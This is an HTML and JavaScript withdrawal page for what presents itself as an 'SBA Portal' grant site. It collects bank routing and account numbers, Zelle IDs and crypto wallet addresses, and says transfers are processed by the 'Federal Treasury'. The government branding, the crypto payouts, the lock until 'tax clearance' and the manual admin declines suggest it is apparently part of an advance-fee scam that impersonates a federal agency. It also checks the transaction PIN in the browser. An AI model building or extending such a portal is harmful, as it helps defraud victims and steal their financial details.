<!DOCTYPE html>
<html lang="en" data-theme="light">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Withdraw Funds | SBA Portal</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <link rel="stylesheet" href="global.css">
    <style>
        .method-tab { display: none; animation: fadeSlide 0.3s ease; }
        .method-tab.active { display: block; }
        .balance-hero { background: var(--navy); color: white; padding: 32px; border-radius: var(--r-xl); text-align: center; margin-bottom: 32px; box-shadow: var(--shadow-navy); }
        .balance-hero__val { font-size: 2.8rem; font-weight: 900; letter-spacing: -0.02em; margin: 8px 0; }
        .balance-hero__label { font-size: 0.8rem; text-transform: uppercase; opacity: 0.7; font-weight: 700; letter-spacing: 0.1em; }
        
        .tab-btn { flex: 1; padding: 12px; font-size: 0.85rem; border-bottom: 2px solid transparent; color: var(--text-muted); cursor: pointer; background: none; border: none; font-weight: 700; transition: 0.2s; }
        .tab-btn.active { color: var(--navy); border-bottom-color: var(--navy); }
    </style>
</head>
<body>
<div id="pageLoader" class="page-loader active"><div class="spinner"></div></div>
<div class="app-layout">
    <aside class="app-sidebar" id="appSidebar"></aside>
    <main class="app-main">
        <div id="pageHeader"></div>
        <div class="app-main__content" style="max-width: 800px;">
            
            <div id="lockedView" class="status-screen" style="display:none;">
                <div class="status-screen__icon status-screen__icon--info"><i class="fa-solid fa-lock"></i></div>
                <h1 class="status-screen__title">Withdrawal Locked</h1>
                <p class="status-screen__message">Payouts are only enabled after your Grant Award Certificate has been issued and tax clearance is finalized.</p>
                <a href="award.html" class="btn btn--primary">View Award Status</a>
            </div>

            <div id="statusView" class="status-screen" style="display:none;">
                <div id="stIcon" class="status-screen__icon"></div>
                <h1 id="stTitle" class="status-screen__title"></h1>
                <p id="stMsg" class="status-screen__message"></p>
                <div id="stActions"></div>
            </div>

            <div id="withdrawForm" style="display:none;">
                <div class="balance-hero">
                    <div class="balance-hero__label">Available for Withdrawal</div>
                    <div class="balance-hero__val" id="displayBal">$0.00</div>
                    <div class="badge badge--success" style="background:rgba(255,255,255,0.1); color:white;">Verified Funds</div>
                </div>

                <div class="card mb-8">
                    <div class="flex border-bottom mb-6">
                        <button class="tab-btn active" data-m="bank">Bank Transfer</button>
                        <button class="tab-btn" data-m="zelle">Zelle</button>
                        <button class="tab-btn" data-m="crypto">Crypto</button>
                    </div>

                    <form id="wForm">
                        <!-- Bank -->
                        <div id="m-bank" class="method-tab active">
                            <div class="form-group"><label class="form-label">Bank Name</label><input type="text" id="w-bank-name" class="form-input" placeholder="e.g. Chase Bank"></div>
                            <div class="form-row">
                                <div class="form-group"><label class="form-label">Routing Number</label><input type="text" id="w-bank-route" class="form-input" maxlength="9"></div>
                                <div class="form-group"><label class="form-label">Account Number</label><input type="text" id="w-bank-acc" class="form-input"></div>
                            </div>
                        </div>

                        <!-- Zelle -->
                        <div id="m-zelle" class="method-tab">
                            <div class="form-group"><label class="form-label">Zelle Email or Phone</label><input type="text" id="w-zelle-id" class="form-input" placeholder="identifier@email.com"></div>
                            <div class="form-group"><label class="form-label">Recipient Full Name</label><input type="text" id="w-zelle-name" class="form-input"></div>
                        </div>

                        <!-- Crypto -->
                        <div id="m-crypto" class="method-tab">
                            <div class="form-row">
                                <div class="form-group"><label class="form-label">Coin</label><select id="w-coin" class="form-select"><option value="BTC">Bitcoin (BTC)</option><option value="USDT">USDT</option><option value="ETH">Ethereum (ETH)</option></select></div>
                                <div class="form-group"><label class="form-label">Network</label><select id="w-net" class="form-select"><option value="BTC">Bitcoin</option><option value="ERC20">ERC20</option><option value="TRC20">TRC20</option></select></div>
                            </div>
                            <div class="form-group"><label class="form-label">Your Wallet Address</label><input type="text" id="w-addr" class="form-input" placeholder="Enter your destination address"></div>
                        </div>

                        <div class="form-group mt-6">
                            <label class="form-label">Amount to Withdraw (USD)</label>
                            <input type="number" id="w-amt" class="form-input" style="font-size:1.5rem; font-weight:800; color:var(--navy);" placeholder="0.00">
                            <p class="form-hint" id="maxHint">Maximum: $0.00</p>
                        </div>

                        <div style="background:var(--bg); padding:20px; border-radius:var(--r-lg); margin:24px 0;">
                            <div class="form-group mb-0">
                                <label class="form-label"><i class="fa-solid fa-shield-halved"></i> Transaction PIN</label>
                                <input type="password" id="w-pin" class="form-input text-center" maxlength="4" placeholder="••••" style="letter-spacing:1em; font-size:1.2rem;">
                            </div>
                        </div>

                        <button type="submit" class="btn btn--primary btn--full btn--lg" id="btnSubmit">Request Withdrawal</button>
                    </form>
                </div>
            </div>
        </div>
    </main>
</div>

<script type="module">
    import { updateUserData, addLedgerEntry, notify, notifyAdmins, serverTimestamp, increment } from './firebase-config.js';
    import { requireAuth, buildSidebar, buildDock, buildPageHeader, initNotificationBadge, showToast, setButtonLoading, formatCurrency, showConfirm } from './app.js';

    requireAuth((user, userData) => {
        buildSidebar({ activeId: 'withdraw', userData });
        buildDock({ activeId: 'home' });
        buildPageHeader({ title: 'Withdraw Funds', subtitle: 'Secure Treasury Transfer', backUrl: 'dashboard.html' });
        initNotificationBadge(user.uid);

        const bal = userData.balance || 0;
        document.getElementById('displayBal').textContent = formatCurrency(bal);
        document.getElementById('maxHint').textContent = `Maximum: ${formatCurrency(bal)}`;

        if(userData.awardStatus !== 'APPROVED') {
            document.getElementById('lockedView').style.display = 'block';
        } else if(userData.withdrawStatus === 'IDLE') {
            document.getElementById('withdrawForm').style.display = 'block';
        } else {
            const statusView = document.getElementById('statusView');
            statusView.style.display = 'block';
            const ic = document.getElementById('stIcon');
            if(userData.withdrawStatus === 'PENDING') {
                ic.className = 'status-screen__icon status-screen__icon--info'; ic.innerHTML = '<i class="fa-solid fa-money-bill-transfer fa-bounce"></i>';
                document.getElementById('stTitle').textContent = 'Transfer Pending';
                document.getElementById('stMsg').textContent = 'Your withdrawal request is being processed by the Federal Treasury. Funds typically arrive within 1-3 business days.';
            } else if(userData.withdrawStatus === 'REJECTED') {
                ic.className = 'status-screen__icon status-screen__icon--error'; ic.innerHTML = '<i class="fa-solid fa-circle-xmark"></i>';
                document.getElementById('stTitle').textContent = 'Transfer Declined';
                document.getElementById('stMsg').textContent = userData.withdrawal?.declineReason || 'Security validation failed.';
                document.getElementById('stActions').innerHTML = '<button class="btn btn--outline" id="btnRetry">Try New Method</button>';
                document.getElementById('btnRetry').onclick = () => updateUserData(user.uid, { withdrawStatus: 'IDLE' }).then(()=>location.reload());
            }
        }

        let method = 'bank';
        document.querySelectorAll('.tab-btn').forEach(btn => {
            btn.onclick = () => {
                document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
                document.querySelectorAll('.method-tab').forEach(t => t.classList.remove('active'));
                btn.classList.add('active');
                method = btn.dataset.m;
                document.getElementById('m-'+method).classList.add('active');
            };
        });

        document.getElementById('wForm').onsubmit = async (e) => {
            e.preventDefault();
            const amt = parseFloat(document.getElementById('w-amt').value);
            const pin = document.getElementById('w-pin').value;

            if(amt > bal) return showToast('Insufficient balance', 'error');
            if(amt < 100) return showToast('Minimum withdrawal is $100', 'warning');
            if(pin !== userData.transactionPin) return showToast('Incorrect security PIN', 'error');

            showConfirm({
                title: 'Confirm Withdrawal',
                message: `You are about to transfer ${formatCurrency(amt)} via ${method.toUpperCase()}. This action is permanent.`,
                confirmText: 'Confirm Payout',
                danger: true,
                onConfirm: async () => {
                    const btn = document.getElementById('btnSubmit');
                    setButtonLoading(btn, true);
                    const payload = {
                        method, amount: amt, submittedAt: serverTimestamp(),
                        bankName: document.getElementById('w-bank-name').value,
                        accountNumber: document.getElementById('w-bank-acc').value,
                        routingNumber: document.getElementById('w-bank-route').value,
                        zelleId: document.getElementById('w-zelle-id').value,
                        cryptoAddr: document.getElementById('w-addr').value
                    };

                    try {
                        await updateUserData(user.uid, { withdrawal: payload, withdrawStatus: 'PENDING', balance: increment(-amt) });
                        await addLedgerEntry(user.uid, { type:'withdrawal', amount: -amt, description: `Withdrawal — ${method.toUpperCase()}`, status: 'PENDING' });
                        await notifyAdmins({ title:'Withdrawal Request', message:`${userData.fullName} requested ${formatCurrency(amt)}`, type:'action' });
                        location.reload();
                    } catch(err) {
                        showToast(err.message, 'error');
                        setButtonLoading(btn, false);
                    }
                }
            });
        };
    });
</script>
</body>
</html>
